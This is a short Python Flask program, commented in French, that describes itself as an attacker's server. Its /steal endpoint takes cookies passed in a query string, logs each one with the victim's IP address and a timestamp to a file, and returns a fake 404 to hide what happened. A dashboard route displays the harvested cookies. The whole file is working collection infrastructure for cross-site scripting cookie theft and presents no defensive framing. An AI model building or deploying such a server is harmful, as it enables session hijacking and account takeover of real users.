from flask import Flask, request, render_template
import datetime

app = Flask(__name__)

@app.route('/')
def home():
    """Page d'accueil du serveur attaquant"""
    return render_template('home.html')

@app.route('/steal')
def steal():
    """Endpoint pour récupérer les cookies volés"""
    cookie = request.args.get('c')
    client_ip = request.remote_addr
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print(f"[!] COOKIE VOLÉ ({timestamp}): {cookie}")
    
    # Enregistrer dans un fichier
    with open('stolen_cookies.txt', 'a') as f:
        f.write(f"{timestamp} | {client_ip} | {cookie}\n")
    
    return '<h1>404 Not Found</h1>', 404

@app.route('/dashboard')
def dashboard():
    """Tableau de bord pour afficher les cookies volés"""
    try:
        with open('stolen_cookies.txt', 'r') as f:
            cookies = [line.strip().split(' | ') for line in f.readlines()]
        return render_template('dashboard.html', cookies=cookies)
    except FileNotFoundError:
        return render_template('dashboard.html', cookies=[])

if __name__ == '__main__':
    app.run(port=5001, debug=True)